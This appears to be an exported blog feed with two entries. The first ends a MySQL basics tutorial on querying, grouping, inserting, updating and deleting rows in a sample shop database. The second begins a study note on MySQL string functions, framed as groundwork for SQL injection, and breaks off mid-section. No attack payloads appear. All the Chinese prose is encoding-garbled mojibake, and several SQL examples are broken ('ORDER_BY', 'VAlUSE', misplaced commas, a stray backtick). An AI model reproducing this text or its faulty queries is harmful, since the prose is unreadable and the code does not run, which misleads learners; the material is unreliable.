<h2 id="0x04-æ ·ä¾‹è¡¨åˆ›å»º">0x04 æ ·ä¾‹è¡¨åˆ›å»º</h2>
<p>é™„ä»¶ä¸­åŒ…å«ä¸¤ä¸ªå¯ä»¥æ‰§è¡Œçš„SQLè„šæœ¬æ–‡ä»¶ã€‚</p>
<ul>
<li>create.sqlåŒ…å«åˆ›å»º6ä¸ªæ•°æ®åº“è¡¨ï¼ˆåŒ…æ‹¬æ‰€æœ‰ä¸»é”®å’Œå¤–é”®çº¦æŸï¼‰çš„MySQLè¯­å¥ã€‚</li>
<li>populate.sqlåŒ…å«ç”¨æ¥å¡«å……è¿™äº›è¡¨çš„INSERTè¯­å¥ã€‚</li>
</ul>
<p>ç„¶åæŒ‰ç…§ä»¥ä¸‹æ­¥éª¤åˆ›å»ºæ ·ä¾‹è¡¨</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“</li>
<li>é€‰æ‹©æ–°æ•°æ®æºï¼ˆå¦‚æœä½¿ç”¨mysqlå‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œç”¨USEå‘½ä»¤ï¼‰</li>
<li>æ‰§è¡Œcreate.sqlè„šæœ¬å’Œpopulate.sqlè„šæœ¬ã€‚å¦‚æœä½¿ç”¨mysqlå‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œå¯ç»™å‡º<br>
source create.sql;ï¼ˆæŒ‡å®šcreate.sqlæ–‡ä»¶çš„å®Œå…¨è·¯å¾„ï¼‰</li>
</ul>
<h2 id="0x05-ç®€å•æ£€ç´¢æ•°æ®">0x05 ç®€å•æ£€ç´¢æ•°æ®</h2>
<ul>
<li>å•ä¸ªåˆ—ï¼š<code>SELECT prod_name FROM products;</code></li>
<li>å¤šä¸ªåˆ—ï¼š<code>SELECT pro_id, prod_name, prod_price FROM products;</code></li>
<li>æ‰€æœ‰åˆ—ï¼š<code>SELECT * FROM products;</code></li>
<li>ä¸åŒå€¼çš„è¡Œï¼š<code>SELECT DISTINCT vend_id FROM products;</code></li>
<li>æŒ‡å®šæŸä¸€åŒºé—´çš„è¡Œï¼š<code>SELECT prod_name FROM products LIMIT 5 OFFSET 5;</code></li>
</ul>
<h2 id="0x06-æ’åºæ£€ç´¢æ•°æ®">0x06 æ’åºæ£€ç´¢æ•°æ®</h2>
<ul>
<li>
<p>æŒ‰å•åˆ—æ’åºæ•°æ®ï¼š<code>SELECT prod_name FROM products ORDER_BY prod_name;</code></p>
</li>
<li>
<p>æŒ‰å¤šåˆ—æ’åºæ•°æ®ï¼š<code>SELECT prod_id, prod_price, prod_name FROM products ORDER BY prod_price DESC, prod_name;</code></p>
<blockquote>
<p>æŒ‡å®šprod_priceé™åºæ’åˆ—ï¼Œprod_nameå‡åºæ’åˆ—ã€‚</p>
</blockquote>
</li>
<li>
<p>æ±‚æœ€å¤§å€¼æˆ–æœ€å°å€¼ï¼š<code>SELECT prod_price FROM products ORDER BY prod_price DESC limit 1;</code></p>
</li>
</ul>
<h2 id="0x07-è¿‡æ»¤æ•°æ®">0x07 è¿‡æ»¤æ•°æ®</h2>
<blockquote>
<p>ï¼ˆORDER BYå­å¥ä½äºWHEREå­å¥åé¢ï¼‰</p>
</blockquote>
<p><strong>æ“ä½œç¬¦ç±»å‹ï¼š=, &lt;&gt;, &lt;, &lt;=, &gt;, &gt;=, BETWEEN, IS NULL, AND, OR</strong><br>
å…¶ä¸­ANDæ“ä½œç¬¦çš„ä¼˜å…ˆçº§å¤§äºORæ“ä½œç¬¦ï¼Œä¾‹å¦‚ï¼š<code>SELECT prod_name, prod_price FROM products WHERE vend_id = 1002 OR vend_id = 1003 AND prod_price &gt;= 10;</code> å…¶ç»“æœä¸ºï¼š<br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-4a14e3ec1b92320b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>
INæ“ä½œç¬¦ï¼š<code>SELECT prod_name, prod_price FROM products WHERE vend_id IN (1002, 1003);</code><br>
INæ“ä½œç¬¦ä¸ORæ“ä½œç¬¦çš„ä½œç”¨ç›¸å½“ï¼Œä½†æ˜¯INæ“ä½œç¬¦æœ‰ä»¥ä¸‹å‡ ç‚¹ä¼˜åŠ¿ï¼š</p>
<ul>
<li>INæ“ä½œç¬¦çš„è¯­æ³•æ›´ç›´è§‚ç®€æ´ï¼›</li>
<li>INæ“ä½œç¬¦ä¸€èˆ¬æ¯”ORæ“ä½œç¬¦æ‰§è¡Œæ›´å¿«ï¼›</li>
<li>INæ“ä½œç¬¦æœ€å¤§ä¼˜ç‚¹æ˜¯å¯ä»¥åŒ…å«å…¶ä»–SELECTè¯­å¥ï¼Œä½¿å¾—èƒ½å¤Ÿæ›´åŠ¨æ€çš„åˆ›å»ºWHEREå­å¥ã€‚</li>
</ul>
<h2 id="0x08-é€šé…ç¬¦">0x08 é€šé…ç¬¦</h2>
<ol>
<li>ç™¾åˆ†å·ï¼ˆ<code>%</code>ï¼‰é€šé…ç¬¦ï¼š<code>SELECT prod_id, prod_name FROM  products WHERE prod_name LIKE '%anvil%';</code><br>
æ³¨æ„ï¼š<code>%</code>é€šé…ç¬¦æ— æ³•åŒ¹é…NULLï¼›<code>%</code>é€šé…ç¬¦è¿˜èƒ½åŒ¹é…0ä¸ªå­—ç¬¦ã€‚</li>
<li>ä¸‹åˆ’çº¿ï¼ˆ<code>_</code>ï¼‰é€šé…ç¬¦ï¼šç”¨é€”è·Ÿ<code>%</code>é€šé…ç¬¦ä¸€æ ·ï¼Œä½†æ˜¯<code>_</code>é€šé…ç¬¦åªèƒ½åŒ¹é…å•ä¸ªå­—ç¬¦ã€‚</li>
</ol>
<h2 id="0x09-åˆ›å»ºè®¡ç®—å­—æ®µ">0x09 åˆ›å»ºè®¡ç®—å­—æ®µ</h2>
<ol>
<li>
<p>æ‹¼æ¥å­—æ®µï¼ˆConcat()å‡½æ•°ï¼‰ï¼š<code>SELECT Concat(vend_name, '(' , vend_country, ')') FROM vendors ORDER BY vend_name;</code><br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-a26d319331b89656.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>Trim()å‡½æ•°ï¼šåˆ é™¤æ•°æ®ä¸¤ä¾§å¤šä½™çš„ç©ºæ ¼æ¥æ•´ç†æ•°æ®<br>
<code>SELECT Concat(RTrim(vend_name), '(', RTrim(vend_country), ')' ) FROM vendors ORDER BY vend_name;</code></p>
</li>
<li>
<p>ä½¿ç”¨åˆ«åï¼š<code>SELECT Concat(vend_name, '(' , vend_country, ')') AS vendor_title FROM vendors ORDER BY vend_name;</code><br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-77e6a3849355621f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
</li>
<li>
<p>ç®—æœ¯è®¡ç®—ï¼š<code>SELECT prod_id, quantity, item_price, quantity*item_price AS expanded_price FROM orderitems WHERE order_num = 20005;</code><br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-e73be3ae2f0472d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
</li>
</ol>
<h2 id="0x0A-æ±‡æ€»æ•°æ®">0x0A æ±‡æ€»æ•°æ®</h2>
<ol>
<li>
<p>äº”ç§èšé›†å‡½æ•°ï¼š</p>
<ul>
<li>AVG():è¿”å›æŸåˆ—çš„å¹³å‡å€¼<br>
<code>SELECT  AVG(prod_price) AS avg_price FROM products WHERE vend_id = 1003;</code></li>
<li>COUNT():è¿”å›æŸåˆ—çš„è¡Œæ•°<br>
ç”¨æ³•1ï¼šCOUNT(*)å¯¹è¡¨ä¸­è¡Œçš„æ•°ç›®è¿›è¡Œè®¡æ•°ï¼Œä¸ç®¡è¡¨åˆ—ä¸­åŒ…å«çš„æ˜¯ç©ºå€¼ï¼ˆNULLï¼‰è¿˜æ˜¯éç©ºå€¼ï¼›<br>
<code>SELECT COUNT(*) AS num_cust FROM customers;</code><br>
ç”¨æ³•2ï¼šCOUNT(column)å¯¹ç‰¹å®šåˆ—ä¸­å…·æœ‰å€¼çš„è¡Œè¿›è¡Œè®¡æ•°ï¼Œå¿½ç•¥NULLå€¼ã€‚<br>
`SELECT COUNT(cust_email) AS num_cust FROM customers;</li>
<li>MAX():è¿”å›<strong>æŒ‡å®šåˆ—</strong>ä¸­çš„æœ€å¤§å€¼ï¼ˆå¿½ç•¥å€¼ä¸ºNULLçš„è¡Œï¼‰<br>
<code>SELECT MAX(prod_price) AS max_price FROM products;</code></li>
<li>MIN():è¿”å›<strong>æŒ‡å®šåˆ—</strong>ä¸­çš„æœ€å°å€¼ï¼ˆå¿½ç•¥å€¼ä¸ºNULLçš„è¡Œï¼‰<br>
<code>SELECT MIN(prod_price) AS mIin_price FROM products;</code></li>
<li>SUM():è¿”å›<strong>æŒ‡å®šåˆ—</strong>å€¼çš„å’Œ<br>
<code>SELECT SUM(quantity*item_price) AS total_price FROM orderitems WHERE order_num = 20005;</code></li>
</ul>
</li>
<li>
<p>èšé›†ä¸åŒå€¼<br>
ä»¥ä¸Šçš„äº”ä¸ªèšé›†å‡½æ•°éƒ½å¯ä»¥å¦‚ä¸‹ä½¿ç”¨ï¼š</p>
<ul>
<li>å¯¹æ‰€æœ‰è¡Œæ‰§è¡Œè®¡ç®—æŒ‡å®šALLå‚æ•°æˆ–ä¸ç»™å‚æ•°ï¼ˆALLæ˜¯é»˜è®¤è¡Œä¸ºï¼‰</li>
<li>åªåŒ…å«ä¸åŒçš„å€¼ï¼ŒæŒ‡å®šDISTINCTå‚æ•°<br>
<code>SELECT AVG(DISTINCT prod_price) AS avg_price FROM products WHERE vend_id = 1003;</code></li>
</ul>
</li>
<li>
<p>ç»„åˆèšé›†å‡½æ•°</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> num_items</span><br><span class="line"><span class="keyword">MIN</span>(prod_price) <span class="keyword">AS</span> price_min,</span><br><span class="line"><span class="keyword">MAX</span>(prod_price) <span class="keyword">AS</span> price_max,</span><br><span class="line"><span class="keyword">AVG</span>(prod_price) <span class="keyword">AS</span> price_avg,</span><br><span class="line"><span class="keyword">FROM</span> products;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="0x0B-åˆ†ç»„æ•°æ®">0x0B åˆ†ç»„æ•°æ®</h2>
<ol>
<li>
<h5 id="åˆ›å»ºåˆ†ç»„">åˆ›å»ºåˆ†ç»„</h5>
<p><code>SELECT vend_id, COUNT(*) AS num_prods FROM products GROUP BY vend_id;</code><br>
GROUP BYå­å¥æŒ‡ç¤ºMySQLæŒ‰vend_idæ’åºå¹¶ä¸”åˆ†ç»„æ•°æ®ï¼Œè¿™å¯¼è‡´å¯¹æ¯ä¸ªvend_idè€Œä¸æ˜¯æ•´å¼ è¡¨è®¡ç®—num_prodsä¸€æ¬¡ã€‚</p>
<blockquote>
<p>æ³¨æ„äº‹é¡¹ï¼š</p>
<ul>
<li>GROUP BY å­å¥ä¸­åˆ—å‡ºçš„æ¯ä¸ªåˆ—éƒ½å¿…é¡»æ˜¯æ£€ç´¢åˆ—æˆ–æœ‰æ•ˆçš„è¡¨è¾¾å¼<br>
(ä½†ä¸èƒ½æ˜¯èšé›†å‡½æ•°)ã€‚å¦‚æœåœ¨ SELECT ä¸­ä½¿ç”¨è¡¨è¾¾å¼,åˆ™å¿…é¡»åœ¨<br>
GROUP BY å­å¥ä¸­æŒ‡å®šç›¸åŒçš„è¡¨è¾¾å¼ï¼Œä¸èƒ½ä½¿ç”¨åˆ«åã€‚</li>
<li>é™¤èšé›†è®¡ç®—è¯­å¥å¤–, SELECT è¯­å¥ä¸­çš„æ¯ä¸ªåˆ—éƒ½å¿…é¡»åœ¨ GROUP BY å­<br>
å¥ä¸­ç»™å‡ºç»™å‡ºç›¸åº”çš„åˆ—åã€‚</li>
<li>å¦‚æœåˆ†ç»„åˆ—ä¸­å…·æœ‰ NULL å€¼,åˆ™ NULL å°†ä½œä¸ºä¸€ä¸ªåˆ†ç»„è¿”å›ã€‚å¦‚æœåˆ—<br>
ä¸­æœ‰å¤šè¡Œ NULL å€¼,å®ƒä»¬å°†åˆ†ä¸ºä¸€ç»„ã€‚</li>
<li>GROUP BY å­å¥å¿…é¡»å‡ºç°åœ¨ WHERE å­å¥ä¹‹å, ORDER BY å­å¥ä¹‹å‰ã€‚</li>
</ul>
</blockquote>
</li>
<li>
<h5 id="è¿‡æ»¤åˆ†ç»„">è¿‡æ»¤åˆ†ç»„</h5>
<p><code>SELECT cust_id, COUNT(*) AS orders FROM orders GROUP BY cust_id HAVING COUNT(*) &gt;= 2;</code><br>
HAVING éå¸¸ç±»ä¼¼äº WHERE ã€‚äº‹å®ä¸Š,ç›®å‰ä¸ºæ­¢æ‰€å­¦è¿‡çš„æ‰€æœ‰ç±»å‹çš„ WHERE å­å¥éƒ½å¯ä»¥ç”¨ HAVING æ¥æ›¿ä»£ã€‚å”¯ä¸€çš„å·®åˆ«æ˜¯WHERE è¿‡æ»¤è¡Œ,è€Œ HAVING è¿‡æ»¤åˆ†ç»„ã€‚</p>
<blockquote>
<p><strong>WHERE å’Œ HAVINGçš„å·®åˆ«</strong>ï¼šWHEREåœ¨æ•°æ®åˆ†ç»„å‰è¿›è¡Œè¿‡æ»¤ï¼ŒHAVINGåœ¨æ•°æ®åˆ†ç»„åè¿›è¡Œè¿‡æ»¤ã€‚<code>SELECT vend_id, COUNT(*) AS num_prods FROM products WHERE prod_price &gt;= 10 GROUP BY vend_id  HAVING COUNT(*) &gt;=2;</code><br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-9a412436558ab949.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>WHERE å­å¥è¿‡æ»¤æ‰€æœ‰ prod_price è‡³å°‘ä¸º 10 çš„è¡Œã€‚ç„¶åæŒ‰ vend_id åˆ†ç»„æ•°æ®, HAVING å­å¥è¿‡æ»¤è®¡æ•°ä¸º 2 æˆ– 2 ä»¥ä¸Šçš„åˆ†ç»„ã€‚å¦‚æœæ²¡æœ‰ WHERE å­å¥,å°†ä¼šå¤šæ£€ç´¢å‡ºä¸¤è¡Œ(ä¾›åº”å•† 1002 ,é”€å”®çš„æ‰€æœ‰äº§å“ä»·æ ¼éƒ½åœ¨ 10 ä»¥ä¸‹;ä¾›åº”å•† 1001 ,é”€å”®3ä¸ªäº§å“,ä½†åªæœ‰ä¸€ä¸ªäº§å“çš„ä»·æ ¼å¤§äºç­‰äº 10 )ã€‚<br>
<code>SELECT vend_id, COUNT(*) AS num_prods FROM products GROUP BY vend_id  HAVING COUNT(*) &gt;=2;</code><br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-14ca7d388e91fbe5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
</blockquote>
</li>
<li>
<h5 id="SELECTå­å¥é¡ºåº">SELECTå­å¥é¡ºåº</h5>
<p>SELECT----------FROM----------WHERE----------GROUP BY----------HAVING----------ORDER BY----------LIMIT</p>
</li>
</ol>
<h2 id="0x0C-æ’å…¥æ•°æ®">0x0C æ’å…¥æ•°æ®</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> customers(cust_name,</span><br><span class="line">                     cust_address,</span><br><span class="line">                     cust_city,</span><br><span class="line">                     cust_zip,</span><br><span class="line">                     cust_country,</span><br><span class="line">                     cust_contact,</span><br><span class="line">                     cust_email)</span><br><span class="line">                VAlUSE(<span class="string">&#x27;Pep E. LaPew&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;100 Main Street&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;Los Angeles&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;CA&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;90046&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;USA&#x27;</span>,</span><br><span class="line">                      <span class="literal">NULL</span>,</span><br><span class="line">                      <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>åœ¨æ’å…¥è¡Œæ—¶ï¼ŒMySQLå°†ç”¨VALUESåˆ—è¡¨ä¸­çš„ç›¸åº”å€¼å¡«å…¥åˆ—è¡¨ä¸­çš„å¯¹åº”é¡¹ã€‚VALUESä¸­çš„ç¬¬ä¸€ä¸ªå€¼å¯¹åº”äºç¬¬ä¸€ä¸ªæŒ‡å®šçš„åˆ—åã€‚ç¬¬äºŒä¸ªå€¼å¯¹åº”äºç¬¬äºŒä¸ªåˆ—åï¼Œå¦‚æ­¤ç­‰ç­‰ã€‚</p>
<p>å› ä¸ºæä¾›äº†åˆ—åï¼ŒVALUESå¿…é¡»ä»¥å…¶æŒ‡å®šçš„æ¬¡åºåŒ¹é…æŒ‡å®šçš„åˆ—åï¼Œä¸ä¸€å®šæŒ‰å„ä¸ªåˆ—å‡ºç°åœ¨å®é™…è¡¨ä¸­çš„æ¬¡åºã€‚</p>
<h2 id="0x0D-æ›´æ–°å’Œåˆ é™¤æ•°æ®">0x0D æ›´æ–°å’Œåˆ é™¤æ•°æ®</h2>
<ol>
<li>
<h5 id="æ›´æ–°æ•°æ®">æ›´æ–°æ•°æ®</h5>
<p>åŸºæœ¬çš„UPDATEè¯­å¥ç”±3éƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š</p>
<ul>
<li>è¦æ›´æ–°çš„è¡¨ï¼›</li>
<li>åˆ—åå’Œå®ƒä»¬çš„æ–°å€¼ï¼›</li>
<li>ç¡®å®šè¦æ›´æ–°è¡Œçš„è¿‡æ»¤æ¡ä»¶ã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> customers</span><br><span class="line"><span class="keyword">SET</span> cust_email = <span class="string">&#x27;elmer@fudd.com&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> cust_id = <span class="number">10005</span>;</span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†åˆ é™¤æŸä¸ªåˆ—çš„å€¼ï¼Œå¯è®¾ç½®å®ƒä¸ºNULLï¼ˆå‡å¦‚è¡¨å®šä¹‰å…è®¸NULLå€¼ï¼‰ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> customers</span><br><span class="line"><span class="keyword">SET</span> cust_email = <span class="literal">NULL</span></span><br><span class="line"><span class="keyword">WHERE</span> cust_id = <span class="number">10005</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<h5 id="åˆ é™¤æ•°æ®">åˆ é™¤æ•°æ®</h5>
<p>ä¸‹é¢çš„è¯­å¥ä»customersè¡¨ä¸­åˆ é™¤ä¸€è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELETE FROM customers</span><br><span class="line">WHERE cust_id &#x3D; 10006;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥ä¸“é¡¹ä¹‹MySQLåŸºç¡€æ“ä½œ</title>
    <url>/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="SQLæ³¨å…¥ä¸“é¡¹ä¹‹MySQLåŸºç¡€æ³¨å…¥è¯­æ³•">SQLæ³¨å…¥ä¸“é¡¹ä¹‹MySQLåŸºç¡€æ³¨å…¥è¯­æ³•</h1>
<p>åŸºæœ¬ä¸Šæ‘˜è‡ªk0rz3nå¸ˆå‚…çš„<a href="https://www.k0rz3n.com/2019/01/30/SQL%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93">ä¸€ç¯‡æ–‡ç« </a>ï¼Œæ—¥å¸¸è†œã€‚</p>
<h3 id="å­—ç¬¦ä¸²æ“ä½œ">å­—ç¬¦ä¸²æ“ä½œ</h3>
<h4 id="åˆå¹¶å­—ç¬¦ä¸²">åˆå¹¶å­—ç¬¦ä¸²</h4>
<h5 id="concat">concat</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select concat(&#39;hel&#39;,&#39;lo&#39;,&#39;world&#39;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| concat(&#39;hel&#39;,&#39;lo&#39;,&#39;world&#39;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| helloworld                 |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="concat-ws">concat_ws</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&#39;+&#39;, &#39;hello&#39;, &#39;world&#39;);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| concat_ws(&#39;+&#39;, &#39;hello&#39;, &#39;world&#39;) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| hello+world                      |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h4 id="æˆªå–å­—ç¬¦ä¸²">æˆªå–å­—ç¬¦ä¸²</h4>
<h5 id="substræˆ–substringæˆ–mid">substræˆ–substringæˆ–mid</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select substring(&#39;www.baidu.com&#39;,&#39;5&#39;,5);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| substring(&#39;www.baidu.com&#39;,&#39;5&#39;,5) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| baidu                            |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="left">left</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select left(&#39;flag&#123;this_is_test&#125;&#39;, 5);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| left(&#39;flag&#123;this_is_test&#125;&#39;, 5) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| flag&#123;                         |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="right">right</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select right(&#39;flag&#123;this_is_test&#125;&#39;, 5);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| right(&#39;flag&#123;this_is_test&#125;&#39;, 5) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| test&#125;                          |</span><br><span class="line">+--------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="substring-index">substring_index</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,1);</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,1) |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| flag&#123;111111                                         |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-1);</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-1) |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| 333333&#125;                                              |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-2);</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-2) |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| 222222-333333&#125;                                       |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h4 id="è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦">è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦</h4>
<h5 id="char-length-character-length-å’Œ-length-octet-length">char_length()/character_length() å’Œ length()/octet_length()</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select char_length(&#39;ä½ å¥½&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| char_length(&#39;ä½ å¥½&#39;)   |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     2 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select length(&#39;ä½ å¥½&#39;);</span><br><span class="line">+------------------+</span><br><span class="line">| length(&#39;ä½ å¥½&#39;)   |</span><br><span class="line">+------------------+</span><br><span class="line">|                6 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>char_length()/character_length() è®¡ç®—çš„æ˜¯å­—ç¬¦çš„ä¸ªæ•°ï¼Œè€Œlength()/octet_length() è®¡ç®—çš„æ˜¯å­—èŠ‚çš„é•¿åº¦</p>
</blockquote>
<h4 id="æ”¹å˜å­˜å‚¨çš„å­—ç¬¦ä¸²">æ”¹å˜å­˜å‚¨çš„å­—ç¬¦ä¸²</h4>
<p>å°† colname åˆ—çš„åŒå¼•å·æ¢æˆå•å¼•å·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">replace(colname,&#39;&quot;&#39;,&#39;\&#39;&#39;);</span><br></pre></td></tr></table></figure>
<h4 id="æŸ¥æ‰¾å­å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²ä¸­çš„ä½ç½®">æŸ¥æ‰¾å­å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²ä¸­çš„ä½ç½®</h4>
<h5 id="locate">locate</h5>
<ul>
<li>
<p>locate(substr, str)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select locate(&#39;bar&#39;, &#39;foobar&#39;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| locate(&#39;bar&#39;, &#39;foobar&#39;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       4 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select locate(&#39;xbar&#39;, &#39;foobar&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| locate(&#39;xbar&#39;, &#39;foobar&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        0 |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>locate(substr, str, pos)/position</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select locate(&#39;bar&#39;, &#39;foobarbar&#39;, 5);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| locate(&#39;bar&#39;, &#39;foobarbar&#39;, 5) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|                             7 |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="instr">instr</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select instr(&#39;123&#39;, &#39;12&#39;);</span><br><span class="line">+--------------------+</span><br><span class="line">| instr(&#39;123&#39;, &#39;12&#39;) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select instr(&#39;123&#39;, &#39;4&#39;);</span><br><span class="line">+-------------------+</span><br><span class="line">| instr(&#39;123&#39;, &#39;4&#39;) |</span><br><span class="line">+-------------------+</span><br><span class="line">|                 0 |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="find-in-set">find_in_set</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select find_in_set(&#39;a&#39;,&#39;a,b,c,d,e&#39;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| find_in_set(&#39;a&#39;,&#39;a,b,c,d,e&#39;) |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            1 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h4 id="æ­£åˆ™åŒ¹é…">æ­£åˆ™åŒ¹é…</h4>
<h5 id="like">like</h5>
<p>å¸¸ç”¨é€šé…ç¬¦ï¼š</p>
